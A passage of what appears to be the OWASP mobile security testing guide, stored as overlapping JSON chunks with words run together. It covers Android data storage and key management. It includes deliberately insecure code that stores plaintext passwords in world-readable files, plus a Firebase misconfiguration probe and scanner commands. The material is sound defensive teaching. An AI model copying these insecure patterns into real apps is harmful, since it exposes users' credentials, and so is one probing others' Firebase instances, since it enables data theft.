    "text": "cases. This overview providesabriefoutlineofthesedatastoragemethodsandpointstesterstofurtherrelevantdocumentation. Shared Preferences The SharedPreferences API is commonly used to permanently save small collections of key-value pairs. Data stored in a SharedPreferences object is written to a plain-text XML file. The SharedPreferences object can be declared world- readable(accessibletoallapps)orprivate. MisuseoftheSharedPreferencesAPIcanoftenleadtoexposureofsensitive data. Considerthefollowingexample: ExampleforJava: SharedPreferencessharedPref =getSharedPreferences(\"key\",MODE_WORLD_READABLE); SharedPreferences.Editor editor =sharedPref.edit(); editor.putString(\"username\",\"administrator\"); editor.putString(\"password\",\"supersecret\"); editor.commit(); 190\\nExampleforKotlin: varsharedPref =getSharedPreferences(\"key\",Context.MODE_WORLD_READABLE) vareditor =sharedPref.edit() editor.putString(\"username\",\"administrator\") editor.putString(\"password\",\"supersecret\") editor.commit() Oncetheactivityhasbeencalled,thefilekey.xmlwillbecreatedwiththeprovideddata. Thiscodeviolatesseveralbest practices. • Theusernameandpasswordarestoredincleartextin/data/data/<package-name>/shared_prefs/key.xml. <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <map> <string name=\"username\">administrator</string> <string name=\"password\">supersecret</string> </map> • MODE_WORLD_READABLEallowsallapplicationstoaccessandreadthecontentsofkey.xml. root@hermes:/data/data/sg.vp.owasp_mobile.myfirstapp/shared_prefs #ls-la -rw-rw-r--u0_a118 1702016-04-2316:51key.xml PleasenotethatMODE_WORLD_READABLEandMODE_WORLD_WRITEABLEweredeprecatedstartingonAPIlevel17. Al- thoughnewerdevicesmaynotbeaffectedbythis,applicationscompiledwithanandroid:targetSdkVersionvalue lessthan17maybeaffectediftheyrunonanOSversionthatwasreleasedbeforeAndroid4.2(APIlevel17). Databases TheAndroidplatformprovidesanumberofdatabaseoptionsasaforementionedinthepreviouslist. Eachdatabaseoption hasitsownquirksandmethodsthatneedtobeunderstood. SQLite Database (Unencrypted) SQLiteisanSQLdatabaseenginethatstoresdatain.dbfiles. TheAndroidSDKhasbuilt-insupportforSQLitedatabases. Themainpackageusedtomanagethedatabasesisandroid.database.sqlite. Forexample,youmayusethefollowing codetostoresensitiveinformationwithinanactivity: ExampleinJava: SQLiteDatabasenotSoSecure =openOrCreateDatabase(\"privateNotSoSecure\",MODE_PRIVATE,null); notSoSecure.execSQL(\"CREATETABLEIFNOTEXISTSAccounts(UsernameVARCHAR,PasswordVARCHAR);\"); notSoSecure.execSQL(\"INSERTINTOAccountsVALUES('admin','AdminPass');\"); notSoSecure.close(); ExampleinKotlin: varnotSoSecure =openOrCreateDatabase(\"privateNotSoSecure\",Context.MODE_PRIVATE,null) notSoSecure.execSQL(\"CREATETABLEIFNOTEXISTSAccounts(UsernameVARCHAR,PasswordVARCHAR);\") notSoSecure.execSQL(\"INSERTINTOAccountsVALUES('admin','AdminPass');\") notSoSecure.close() Once the activity has been called, the database file privateNotSoSecure will be created with the provided data and storedinthecleartextfile/data/data/<package-name>/databases/privateNotSoSecure. Thedatabase’sdirectorymaycontainseveralfilesbesidestheSQLitedatabase: • Journalfiles: Thesearetemporaryfilesusedtoimplementatomiccommitandrollback. • Lock files: The lock files are part of the locking and journaling feature, which was designed to improve SQLite concurrencyandreducethewriterstarvationproblem. SensitiveinformationshouldnotbestoredinunencryptedSQLitedatabases. 191\\nSQLite Databases (Encrypted) WiththelibrarySQLCipher,youcanpassword-encryptSQLitedatabases. ExampleinJava: SQLiteDatabasesecureDB =SQLiteDatabase.openOrCreateDatabase(database,\"password123\",null); secureDB.execSQL(\"CREATETABLEIFNOTEXISTSAccounts(UsernameVARCHAR,PasswordVARCHAR);\"); secureDB.execSQL(\"INSERTINTOAccountsVALUES('admin','AdminPassEnc');\"); secureDB.close(); ExampleinKotlin: varsecureDB =SQLiteDatabase.openOrCreateDatabase(database,\"password123\",null) secureDB.execSQL(\"CREATETABLEIFNOTEXISTSAccounts(UsernameVARCHAR,PasswordVARCHAR);\") secureDB.execSQL(\"INSERTINTOAccountsVALUES('admin','AdminPassEnc');\") secureDB.close() Securewaystoretrievethedatabasekeyinclude: • AskingtheusertodecryptthedatabasewithaPINorpasswordoncetheappisopened(weakpasswordsandPINs arevulnerabletobruteforceattacks) • Storingthekeyontheserverandallowingittobeaccessedfromawebserviceonly(sothattheappcanbeused onlywhenthedeviceisonline) Firebase Real-time Databases Firebaseisadevelopmentplatformwithmorethan15products,andoneofthemisFirebaseReal-timeDatabase. Itcan beleveragedbyapplicationdeveloperstostoreandsyncdatawithaNoSQLcloud-hosteddatabase. Thedataisstored asJSONandissynchronizedinreal-timetoeveryconnectedclientandalsoremainsavailableevenwhentheapplication goesoffline. AmisconfiguredFirebaseinstancecanbeidentifiedbymakingthefollowingnetworkcall: https://_firebaseProjectName_.firebaseio.com/.json ThefirebaseProjectNamecanberetrievedfromthemobileapplicationbyreverseengineeringtheapplication. Alterna- tively,theanalystscanuseFirebaseScanner,apythonscriptthatautomatesthetaskaboveasshownbelow: pythonFirebaseScanner.py -p<pathOfAPKFile> pythonFirebaseScanner.py -f<commaSeparatedFirebaseProjectNames> Realm Databases TheRealmDatabaseforJavaisbecomingmoreandmorepopularamongdevelopers. Thedatabaseanditscontentscan beencryptedwithakeystoredintheconfigurationfile. //thegetKey()methodeithergetsthekeyfromtheserverorfromaKeyStore,orisderivedfromapassword. RealmConfigurationconfig =newRealmConfiguration.Builder() .encryptionKey(getKey()) .build(); Realmrealm =Realm.getInstance(config); Ifthedatabaseisnotencrypted,youshouldbeabletoobtainthedata. Ifthedatabaseisencrypted,determinewhether thekeyishard-codedinthesourceorresourcesandwhetheritisstoredunprotectedinsharedpreferencesorsomeother location. 192\\nInternal Storage Youcansavefilestothedevice’sinternalstorage. Filessavedtointernalstoragearecontainerizedbydefaultandcannot beaccessedbyotherappsonthedevice. Whentheuseruninstallsyourapp,thesefilesareremoved. Thefollowingcode snippetswouldpersistentlystoresensitivedatatointernalstorage. ExampleforJava: FileOutputStreamfos =null; try{ fos=openFileOutput(FILENAME,Context.MODE_PRIVATE); fos.write(test.getBytes()); fos.close(); }catch (FileNotFoundExceptione){ e.printStackTrace(); }catch (IOExceptione){ e.printStackTrace(); } ExampleforKotlin: varfos:FileOutputStream?=null fos=openFileOutput(\"FILENAME\",Context.MODE_PRIVATE) fos.write(test.toByteArray(Charsets.UTF_8)) fos.close() Youshouldcheckthefilemodetomakesurethatonlytheappcanaccessthefile. YoucansetthisaccesswithMODE_PRI- VATE.ModessuchasMODE_WORLD_READABLE(deprecated)andMODE_WORLD_WRITEABLE(deprecated)mayposeasecurity risk. SearchfortheclassFileInputStreamtofindoutwhichfilesareopenedandreadwithintheapp. External Storage EveryAndroid-compatibledevicesupportssharedexternalstorage. Thisstoragemayberemovable(suchasanSDcard) or internal (non-removable). Files saved to external storage are world-readable. The user can modify them when USB massstorageisenabled. Youcanusethefollowingcodesnippetstopersistentlystoresensitiveinformationtoexternal storageasthecontentsofthefilepassword.txt. ExampleforJava: Filefile =newFile (Environment.getExternalFilesDir(),\"password.txt\"); Stringpassword =\"SecretPassword\"; FileOutputStreamfos; fos=newFileOutputStream(file); fos.write(password.getBytes()); fos.close(); ExampleforKotlin: valpassword =\"SecretPassword\" valpath =context.getExternalFilesDir(null) valfile =File(path,\"password.txt\") file.appendText(password) Thefilewillbecreatedandthedatawillbestoredinacleartextfileinexternalstorageoncetheactivityhasbeencalled. It’salsoworthknowingthatfilesstoredoutsidetheapplicationfolder(data/data/<package-name>/)willnotbedeleted whentheuseruninstallstheapplication. Finally,it’sworthnotingthattheexternalstoragecanbeusedbyanattackerto allowforarbitrarycontroloftheapplicationinsomecases. Formoreinformation: seetheblogpostfromCheckpoint. 193\\nKeyStore TheAndroidKeyStoresupportsrelativelysecurecredentialstorage. AsofAndroid4.3(APIlevel18),itprovidespublicAPIs forstoringandusingapp-privatekeys. Anappcanuseapublickeytocreateanewprivate/publickeypairforencrypting applicationsecrets,anditcandecryptthesecretswiththeprivatekey. YoucanprotectkeysstoredintheAndroidKeyStorewithuserauthenticationinaconfirmcredentialflow. Theuser’slock screencredentials(pattern,PIN,password,orfingerprint)areusedforauthentication. Youcanusestoredkeysinoneoftwomodes: 1. Usersareauthorizedtousekeysforalimitedperiodoftimeafterauthentication. Inthismode,allkeyscanbeused assoonastheuserunlocksthedevice. Youcancustomizetheperiodofauthorizationforeachkey. Youcanuse thisoptiononlyifthesecurelockscreenisenabled. Iftheuserdisablesthesecurelockscreen,allstoredkeyswill becomepermanentlyinvalid. 2. Usersareauthorizedtouseaspecificcryptographicoperationthatisassociatedwithonekey. Inthismode,users mustrequestaseparateauthorizationforeachoperationthatinvolvesthekey. Currently,fingerprintauthentication istheonlywaytorequestsuchauthorization. ThelevelofsecurityaffordedbytheAndroidKeyStoredependsonitsimplementation,whichdependsonthedevice. Most moderndevicesofferahardware-backedKeyStoreimplementation: keysaregeneratedandusedinaTrustedExecution Environment(TEE)oraSecureElement(SE),andtheoperatingsystemcan’taccessthemdirectly. Thismeansthatthe encryptionkeysthemselvescan’tbeeasilyretrieved,evenfromarooteddevice. Youcanverifyhardware-backedkeys withKeyAttestation. Youcandeterminewhetherthekeysareinsidethesecurehardwarebycheckingthereturnvalueof theisInsideSecureHardwaremethod,whichispartoftheKeyInfoclass. NotethattherelevantKeyInfoindicatesthatsecretkeysandHMACkeysareinsecurelystoredonseveraldevices despiteprivatekeysbeingcorrectlystoredonthesecurehardware. Thekeysofasoftware-onlyimplementationareencryptedwithaper-userencryptionmasterkey. Anattackercanaccess allkeysstoredonrooteddevicesthathavethisimplementationinthefolder/data/misc/keystore/. Becausetheuser’s lock screen pin/password is used to generate the master key, the Android KeyStore is unavailable when the device is locked. FormoresecurityAndroid9(APIlevel28)introducestheunlockedDeviceRequiredflag. Bypassingtruetothe setUnlockedDeviceRequiredmethod,theapppreventsitskeysstoredinAndroidKeystorefrombeingdecryptedwhen thedeviceislocked,anditrequiresthescreentobeunlockedbeforeallowingdecryption. Hardware-backed Android KeyStore Thehardware-backedAndroidKeyStoregivesanotherlayertodefense-in-depthsecurityconceptforAndroid. Keymaster HardwareAbstractionLayer(HAL)wasintroducedwithAndroid6(APIlevel23). Applicationscanverifyifthekeyisstored insidethesecurityhardware(bycheckingifKeyInfo.isinsideSecureHardwarereturnstrue). DevicesrunningAndroid 9 (API level 28) and higher can have a StrongBox Keymaster module, an implementation of the Keymaster HAL that resides in a hardware security module which has its own CPU, secure storage, a true random number generator and a mechanismtoresistpackagetampering. Tousethisfeature,truemustbepassedtothesetIsStrongBoxBackedmethod ineithertheKeyGenParameterSpec.BuilderclassortheKeyProtection.Builderclasswhengeneratingorimporting keysusingAndroidKeystore. TomakesurethatStrongBoxisusedduringruntime,checkthatisInsideSecureHardware returnstrueandthatthesystemdoesnotthrowStrongBoxUnavailableException,whichgetsthrowniftheStrongBox Keymasterisn’tavailableforthegivenalgorithmandkeysizeassociatedwithakey. Descriptionoffeaturesonhardware- basedkeystorecanbefoundonAOSPpages. KeymasterHALisaninterfacetohardware-backedcomponents-TrustedExecutionEnvironment(TEE)oraSecureElement (SE),whichisusedbyAndroidKeystore. Anexampleofsuchahardware-backedcomponentisTitanM. Key Attestation FortheapplicationswhichheavilyrelyonAndroidKeystoreforbusiness-criticaloperations,suchasmulti-factorauthen- tication through cryptographic primitives, secure storage of sensitive data at the client-side, etc. Android provides the 194\\nfeatureofKeyAttestation,whichhelpstoanalyzethesecurityofcryptographicmaterialmanagedthroughAndroidKey- store. FromAndroid8.0(APIlevel26),thekeyattestationwasmademandatoryforallnew(Android7.0orhigher)devices thatneedtohavedevicecertificationforGoogleapps. SuchdevicesuseattestationkeyssignedbytheGooglehardware AttestationRootcertificateandthesamecanbeverifiedthroughthekeyattestationprocess. Duringkeyattestation,wecanspecifythealiasofakeypairandinreturn,getacertificatechain,whichwecanuseto verifythepropertiesofthatkeypair. IftherootcertificateofthechainistheGoogleHardwareAttestationRootcertificate, andthechecksrelatedtokeypairstorageinhardwarearemade,itgivesanassurancethatthedevicesupportshardware- levelkeyattestation,andthatthekeyisinthehardware-backedkeystorethatGooglebelievestobesecure. Alternatively, if the attestation chain has any other root certificate, then Google does not make any claims about the security of the hardware. Althoughthekeyattestationprocesscanbeimplementedwithintheapplicationdirectly,itisrecommendedthatitshould beimplementedattheserver-sideforsecurityreasons. Thefollowingarethehigh-levelguidelinesforthesecureimple- mentationofKeyAttestation: • TheservershouldinitiatethekeyattestationprocessbycreatingarandomnumbersecurelyusingCSPRNG(Cryp- tographicallySecureRandomNumberGenerator)andthesameshouldbesenttotheuserasachallenge. • TheclientshouldcallthesetAttestationChallengeAPIwiththechallengereceivedfromtheserverandshould thenretrievetheattestationcertificatechainusingtheKeyStore.getCertificateChainmethod. • Theattestationresponseshouldbesenttotheserverfortheverificationandfollowingchecksshouldbeperformed fortheverificationofthekeyattestationresponse: – Verifythecertificatechain,uptotherootandperformcertificatesanitycheckssuchasvalidity,integrityand trustworthiness. ChecktheCertificateRevocationStatusListmaintainedbyGoogle,ifnoneofthecertificates inthechainwasrevoked. – CheckiftherootcertificateissignedwiththeGoogleattestationrootkeywhichmakestheattestationprocess trustworthy. – Extract the attestation certificate extension",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 81
    }
  },
  {
    "text": "Alternatively, if the attestation chain has any other root certificate, then Google does not make any claims about the security of the hardware. Althoughthekeyattestationprocesscanbeimplementedwithintheapplicationdirectly,itisrecommendedthatitshould beimplementedattheserver-sideforsecurityreasons. Thefollowingarethehigh-levelguidelinesforthesecureimple- mentationofKeyAttestation: • TheservershouldinitiatethekeyattestationprocessbycreatingarandomnumbersecurelyusingCSPRNG(Cryp- tographicallySecureRandomNumberGenerator)andthesameshouldbesenttotheuserasachallenge. • TheclientshouldcallthesetAttestationChallengeAPIwiththechallengereceivedfromtheserverandshould thenretrievetheattestationcertificatechainusingtheKeyStore.getCertificateChainmethod. • Theattestationresponseshouldbesenttotheserverfortheverificationandfollowingchecksshouldbeperformed fortheverificationofthekeyattestationresponse: – Verifythecertificatechain,uptotherootandperformcertificatesanitycheckssuchasvalidity,integrityand trustworthiness. ChecktheCertificateRevocationStatusListmaintainedbyGoogle,ifnoneofthecertificates inthechainwasrevoked. – CheckiftherootcertificateissignedwiththeGoogleattestationrootkeywhichmakestheattestationprocess trustworthy. – Extract the attestation certificate extension data, which appears within the first element of the certificate chain,andperformthefollowingchecks: ∗ Verifythattheattestationchallengeishavingthesamevaluewhichwasgeneratedattheserverwhile initiatingtheattestationprocess. ∗ Verifythesignatureinthekeyattestationresponse. ∗ VerifythesecurityleveloftheKeymaster,todetermineifthedevicehassecurekeystoragemechanism. Keymaster is a piece of software that runs in the security context and provides all the secure keystore operations. ThesecuritylevelwillbeoneofSoftware, TrustedEnvironmentorStrongBox. Theclient supports hardware-level key attestation if the security level is TrustedEnvironment or StrongBox and theattestationcertificatechaincontainsarootcertificatesignedwiththeGoogleattestationrootkey. ∗ Verifytheclient’sstatustoensureafullchainoftrust-verifiedbootkey,lockedbootloaderandverified bootstate. ∗ Additionally,youcanverifythekeypair’sattributessuchaspurpose,accesstime,authenticationrequire- ment,etc. Note,ifforanyreasonthatprocessfails,itmeansthatthekeyisnotinsecurityhardware. Thatdoesnotmeanthat thekeyiscompromised. ThetypicalexampleofAndroidKeystoreattestationresponselookslikethis: { \"fmt\":\"android-key\", \"authData\":\"9569088f1ecee3232954035dbd10d7cae391305a2751b559bb8fd7cbb229bd...\", \"attStmt\":{ \"alg\":-7, \"sig\":\"304402202ca7a8cfb6299c4a073e7e022c57082a46c657e9e53...\", \"x5c\":[ \"308202ca30820270a003020102020101300a06082a8648ce3d040302308188310b30090603550406130...\", \"308202783082021ea00302010202021001300a06082a8648ce3d040302308198310b300906035504061...\", \"3082028b30820232a003020102020900a2059ed10e435b57300a06082a8648ce3d040302308198310b3...\" ] } } IntheaboveJSONsnippet,thekeyshavethefollowingmeaning: • fmt: Attestationstatementformatidentifier 195\\n• authData: Itdenotestheauthenticatordatafortheattestation • alg: ThealgorithmthatisusedfortheSignature • sig: Signature • x5c: Attestationcertificatechain Note: The sig is generated by concatenating authData and clientDataHash (challenge sent by the server) and signingthroughthecredentialprivatekeyusingthealgsigningalgorithm. Thesameisverifiedattheserver-side byusingthepublickeyinthefirstcertificate. Formoreunderstandingontheimplementationguidelines,youcanrefertoGoogleSampleCode. For the security analysis perspective, the analysts may perform the following checks for the secure implementation of KeyAttestation: • Checkifthekeyattestationistotallyimplementedontheclient-side. Inwhichcase,itcanbemoreeasilybypassed bytamperingtheapplication,methodhooking,etc. • Checkiftheserverusesrandomchallengewhileinitiatingthekeyattestation. Asfailingtodothatwouldleadto insecureimplementationthusmakingitvulnerabletoreplayattacks. Also,checkspertainingtotherandomnessof thechallengeshouldbeperformed. • Checkiftheserververifiestheintegrityofthekeyattestationresponse. • Check if the server performs basic checks such as integrity verification, trust verification, validity, etc. on the certificatesinthechain. Secure Key Import into Keystore Android 9 (API level 28) adds the ability to import keys securely into the AndroidKeystore. First, AndroidKeystore generatesakeypairusingPURPOSE_WRAP_KEY,whichshouldalsobeprotectedwithanattestationcertificate. Thispair aims to protect the Keys being imported to AndroidKeystore. The encrypted keys are generated as ASN.1-encoded message in the SecureKeyWrapper format, which also contains a description of the ways the imported key is allowed to be used. The keys are then decrypted inside the AndroidKeystore hardware belonging to the specific device that generatedthewrappingkey,sothattheyneverappearasplaintextinthedevice’shostmemory. 196\\nFigure 2: Secure key import into Keystore ExampleinJava: KeyDescription ::=SEQUENCE { keyFormatINTEGER, authorizationListAuthorizationList } SecureKeyWrapper ::=SEQUENCE { wrapperFormatVersionINTEGER, encryptedTransportKeyOCTET_STRING, initializationVectorOCTET_STRING, keyDescriptionKeyDescription, secureKeyOCTET_STRING, tagOCTET_STRING } ThecodeabovepresentsthedifferentparameterstobesetwhengeneratingtheencryptedkeysintheSecureKeyWrapper format. ChecktheAndroiddocumentationonWrappedKeyEntryformoredetails. WhendefiningtheKeyDescriptionAuthorizationList,thefollowingparameterswillaffecttheencryptedkeyssecurity: • Thealgorithmparameterspecifiesthecryptographicalgorithmwithwhichthekeyisused • ThekeySizeparameterspecifiesthesize,inbits,ofthekey,measuringinthenormalwayforthekey’salgorithm • Thedigestparameterspecifiesthedigestalgorithmsthatmaybeusedwiththekeytoperformsigningandverifi- cationoperations 197\\nOlder KeyStore Implementations OlderAndroidversions don’t includeKeyStore, but theydoincludethe KeyStoreinterface fromJCA(Java Cryptography Architecture). YoucanuseKeyStoresthatimplementthisinterfacetoensurethesecrecyandintegrityofkeysstoredwith KeyStore;BouncyCastleKeyStore(BKS)isrecommended. Allimplementationsarebasedonthefactthatfilesarestored onthefilesystem;allfilesarepassword-protected. Tocreateone,usetheKeyStore.getInstance(\"BKS\",\"BC\")method, where “BKS” is the KeyStore name (BouncyCastle Keystore) and “BC” is the provider (BouncyCastle). You can also use SpongyCastleasawrapperandinitializetheKeyStoreasfollows: KeyStore.getInstance(\"BKS\", \"SC\"). BeawarethatnotallKeyStoresproperlyprotectthekeysstoredintheKeyStorefiles. Storing a Cryptographic Key: Techniques TomitigateunauthorizeduseofkeysontheAndroiddevice,AndroidKeyStoreletsappsspecifyauthorizedusesoftheir keyswhengeneratingorimportingthekeys. Oncemade,authorizationscannotbechanged. StoringaKey-frommostsecuretoleastsecure: • thekeyisstoredinhardware-backedAndroidKeyStore • allkeysarestoredonserverandareavailableafterstrongauthentication • themasterkeyisstoredontheserverandusedtoencryptotherkeys,whicharestoredinAndroidSharedPreferences • thekeyisderivedeachtimefromastronguserprovidedpassphrasewithsufficientlengthandsalt • thekeyisstoredinthesoftwareimplementationofAndroidKeyStore • themasterkeyisstoredinthesoftwareimplementationofAndroidKeystoreandusedtoencryptotherkeys,which arestoredinSharedPreferences • [notrecommended]allkeysarestoredinSharedPreferences • [notrecommended]hardcodedencryptionkeysinthesourcecode • [notrecommended]predictableobfuscationfunctionorkeyderivationfunctionbasedonstableattributes • [notrecommended]storedgeneratedkeysinpublicplaces(like/sdcard/) Storing Keys Using Hardware-backed Android KeyStore You can use the hardware-backed Android KeyStore if the device is running Android 7.0 (API level 24) and above with availablehardwarecomponent(TrustedExecutionEnvironment(TEE)oraSecureElement(SE)).Youcanevenverifythat the keys are hardware-backed by using the guidelines provided for the secure implementation of Key Attestation. If a hardwarecomponentisnotavailableand/orsupportforAndroid6.0(APIlevel23)andbelowisrequired,thenyoumight wanttostoreyourkeysonaremoteserverandmakethemavailableafterauthentication. Storing Keys on the Server Itispossibletosecurelystorekeysonakeymanagementserver,howevertheappneedstobeonlinetodecryptthedata. Thismightbealimitationforcertainmobileappusecasesandshouldbecarefullythoughtthrough,asthisbecomespart ofthearchitectureoftheappandmighthighlyimpactusability. Deriving Keys from User Input Derivingakeyfromauserprovidedpassphraseisacommonsolution(dependingonwhichAndroidAPIlevelyouuse), butitalsoimpactsusability,mightaffecttheattacksurfaceandcouldintroduceadditionalweaknesses. Eachtimetheapplicationneedstoperformacryptographicoperation,theuser’spassphraseisneeded. Eithertheuser ispromptedforiteverytime, whichisn’tanidealuserexperience,orthepassphraseiskeptinmemoryaslongasthe userisauthenticated. Keepingthepassphraseinmemoryisnotabest-practice,asanycryptographicmaterialmustonly bekeptinmemorywhileitisbeingused. Zeroingoutakeyisoftenaverychallengingtaskasexplainedin“Cleaningout KeyMaterial”. Additionally,considerthatkeysderivedfromapassphrasehavetheirownweaknesses. Forinstance,thepasswordsor passphrases might be reused by the user or easy to guess. Please refer to the Testing Cryptography chapter for more information. 198\\nCleaning out Key Material The key material should be cleared out from memory",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 82
    }
  },
  {
    "text": "from User Input Derivingakeyfromauserprovidedpassphraseisacommonsolution(dependingonwhichAndroidAPIlevelyouuse), butitalsoimpactsusability,mightaffecttheattacksurfaceandcouldintroduceadditionalweaknesses. Eachtimetheapplicationneedstoperformacryptographicoperation,theuser’spassphraseisneeded. Eithertheuser ispromptedforiteverytime, whichisn’tanidealuserexperience,orthepassphraseiskeptinmemoryaslongasthe userisauthenticated. Keepingthepassphraseinmemoryisnotabest-practice,asanycryptographicmaterialmustonly bekeptinmemorywhileitisbeingused. Zeroingoutakeyisoftenaverychallengingtaskasexplainedin“Cleaningout KeyMaterial”. Additionally,considerthatkeysderivedfromapassphrasehavetheirownweaknesses. Forinstance,thepasswordsor passphrases might be reused by the user or easy to guess. Please refer to the Testing Cryptography chapter for more information. 198\\nCleaning out Key Material The key material should be cleared out from memory as soon as it is not need anymore. There are certain limitations ofreliablycleaningupsecretdatainlanguageswithgarbagecollector(Java)andimmutablestrings(Swift,Objective-C, Kotlin). Java Cryptography Architecture Reference Guide suggests using char[] instead of String for storing sensitive data,andnullifyarrayafterusage. Note that some ciphers do not properly clean up their byte-arrays. For instance, the AES Cipher in BouncyCastle does notalwayscleanupitslatestworkingkey,leavingsomecopiesofthebyte-arrayinmemory. Next,BigIntegerbasedkeys (e.g.privatekeys)cannotberemovedfromtheheap,norzeroedoutwithoutadditionaleffort. Clearingbytearraycanbe achievedbywritingawrapperwhichimplementsDestroyable. Storing Keys using Android KeyStore API A more user-friendly and recommended way is to use the Android KeyStore API system (itself or through KeyChain) to storekeymaterial. Ifitispossible, hardware-backedstorageshouldbeused. Otherwise, itshouldfallbacktosoftware implementationofAndroidKeystore. However,beawarethattheAndroidKeyStoreAPIhasbeenchangedsignificantly throughoutversionsofAndroid. Inearlierversions, theAndroidKeyStoreAPIonlysupportedstoringpublic/privatekey pairs(e.g.,RSA).SymmetrickeysupporthasonlybeenaddedsinceAndroid6.0(APIlevel23). Asaresult,adeveloper needstohandlethedifferentAndroidAPIlevelstosecurelystoresymmetrickeys. Storing keys by encrypting them with other keys InordertosecurelystoresymmetrickeysondevicesrunningonAndroid5.1(APIlevel22)orlower,weneedtogeneratea public/privatekeypair. WeencryptthesymmetrickeyusingthepublickeyandstoretheprivatekeyintheAndroidKey- Store. Theencryptedsymmetrickeycanbeencodedusingbase64andstoredintheSharedPreferences. Wheneverwe needthesymmetrickey,theapplicationretrievestheprivatekeyfromtheAndroidKeyStoreanddecryptsthesymmetric key. Envelopeencryption,orkeywrapping,isasimilarapproachthatusessymmetricencryptiontoencapsulatekeymaterial. Dataencryptionkeys(DEKs)canbeencryptedwithkeyencryptionkeys(KEKs)whicharesecurelystored. EncryptedDEKs canbestoredinSharedPreferencesorwrittentofiles. Whenrequired,theapplicationreadstheKEK,thendecryptsthe DEK.RefertoOWASPCryptographicStorageCheatSheettolearnmoreaboutencryptingcryptographickeys. Also, as the illustration of this approach, refer to the EncryptedSharedPreferences from androidx.security.crypto pack- age. Insecure options to store keys Alesssecurewayofstoringencryptionkeys,isintheSharedPreferencesofAndroid. WhenSharedPreferencesareused, thefileisonlyreadablebytheapplicationthatcreatedit. However, onrooteddevices, anyotherapplicationwithroot access can read the SharedPreferences file of other apps. This is not the case for the AndroidKeyStore, since Android- KeyStore access is managed on the kernel level, which needs considerably more work and skill to bypass without the AndroidKeyStoreclearingordestroyingthekeys. Thelastthreeoptionsaretousehardcodedencryptionkeysinthesourcecode,havingapredictableobfuscationfunction orkeyderivationfunctionbasedonstableattributes,andstoringgeneratedkeysinpublicplaceslike/sdcard/. Hardcoded encryptionkeysareanissue,sincethismeanseveryinstanceoftheapplicationusesthesameencryptionkey. Anattacker can reverse-engineer a local copy of the application to extract the cryptographic key, and use that key to decrypt any datawhichwasencryptedbytheapplicationonanydevice. Next,whenyouhaveapredictablekeyderivationfunctionbasedonidentifierswhichareaccessibletootherapplications, theattackeronlyneedstofindtheKDFandapplyittothedevicetofindthekey. Lastly,storingencryptionkeyspublicly isalsohighlydiscouraged,asotherapplicationscanhavepermissiontoreadthepublicpartitionandstealthekeys. Data Encryption Using Third Party Libraries Thereareseveraldifferentopen-sourcelibrariesthatofferencryptioncapabilitiesspecifictotheAndroidplatform. • JavaAESCrypto-AsimpleAndroidclassforencryptinganddecryptingstrings. 199\\n• SQL Cipher-SQLCipherisanopensourceextensiontoSQLitethatprovidestransparent256-bitAESencryption ofdatabasefiles. • Themis-Across-platformhigh-levelcryptographiclibrarythatprovidesthesameAPIacrossmanyplatforms,for securingdataduringauthentication,storage,messaging,etc. PleasekeepinmindthataslongasthekeyisnotstoredintheKeyStore,itisalwayspossibletoeasilyretrievethe keyonarooteddeviceandthendecryptthevaluesyouaretryingtoprotect. KeyChain The KeyChain class is used to store and retrieve system-wide private keys and their corresponding certificates (chain). The user will be prompted to set a lock screen pin or password to protect the credential storage if something is being importedintotheKeyChainforthefirsttime. NotethattheKeyChainissystem-wide, everyapplicationcanaccessthe materialsstoredintheKeyChain. InspectthesourcecodetodeterminewhethernativeAndroidmechanismsidentifysensitiveinformation. Sensitiveinfor- mationshouldbeencrypted,notstoredincleartext. Forsensitiveinformationthatmustbestoredonthedevice,several APIcallsareavailabletoprotectthedataviatheKeyChainclass. Completethefollowingsteps: • Make sure that the app is using the Android KeyStore and Cipher mechanisms to securely store encrypted infor- mationonthedevice. LookforthepatternsAndroidKeystore,import java.security.KeyStore,import javax. crypto.Cipher,import java.security.SecureRandom,andcorrespondingusages. • Usethestore(OutputStream stream, char[] password)functiontostoretheKeyStoretodiskwithapassword. Makesurethatthepasswordisprovidedbytheuser,nothard-coded. Logs Therearemanylegitimatereasonstocreatelogfilesonamobiledevice, suchaskeepingtrackofcrashes, errors, and usagestatistics. Logfilescanbestoredlocallywhentheappisofflineandsenttotheendpointoncetheappisonline. However, logging sensitive data may expose the data to attackers or malicious applications, and it might also violate userconfidentiality. Youcancreatelogfilesinseveralways. Thefollowinglistincludestwoclassesthatareavailablefor Android: • LogClass • LoggerClass Backups Android provides users with an auto-backup feature. The backups usually include copies of data and settings for all installedapps. Givenitsdiverseecosystem,Androidsupportsmanybackupoptions: • StockAndroidhasbuilt-inUSBbackupfacilities. WhenUSBdebuggingisenabled,usetheadb backupcommand tocreatefulldatabackupsandbackupsofanapp’sdatadirectory. • Googleprovidesa“BackUpMyData”featurethatbacksupallappdatatoGoogle’sservers. • TwoBackupAPIsareavailabletoappdevelopers: – Key/ValueBackup(BackupAPIorAndroidBackupService)uploadstotheAndroidBackupServicecloud. – AutoBackupforApps: WithAndroid6.0(APIlevel23)andabove, Googleaddedthe“AutoBackupforApps feature”. Thisfeatureautomaticallysyncsatmost25MBofappdatawiththeuser’sGoogleDriveaccount. • OEMsmayprovideadditionaloptions. Forexample,HTCdeviceshavea“HTCBackup”optionthatperformsdaily backupstothecloudwhenactivated. Apps must carefully ensure that sensitive user data doesn’t end within these backups as this may allow an attacker to extractit. 200\\nADB Backup Support Android provides an attribute called allowBackup to back up all your application data. This attribute is set in the AndroidManifest.xmlfile. Ifthevalueofthisattributeistrue,thedeviceallowsuserstobackuptheapplicationwith AndroidDebugBridge(ADB)viathecommand$ adb backup. Topreventtheappdatabackup,settheandroid:allowBackupattributetofalse. Whenthisattributeisunavailable,the allowBackupsettingisenabledbydefault,andbackupmustbemanuallydeactivated. Note: Ifthedevicewasencrypted,thenthebackupfileswillbeencryptedaswell. Process Memory AllapplicationsonAndroidusememorytoperformnormalcomputationaloperationslikeanyregularmodern-daycom- puter. Itisofnosurprisethenthatattimessensitiveoperationswillbeperformedwithinprocessmemory. Forthisreason, itisimportantthatoncetherelevantsensitivedatahasbeenprocessed,itshouldbedisposedfromprocessmemoryas quicklyaspossible. Theinvestigationofanapplication’smemorycanbedonefrommemorydumps,andfromanalyzingthememoryinreal timeviaadebugger. For an overview of possible",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 83
    }
  },
  {
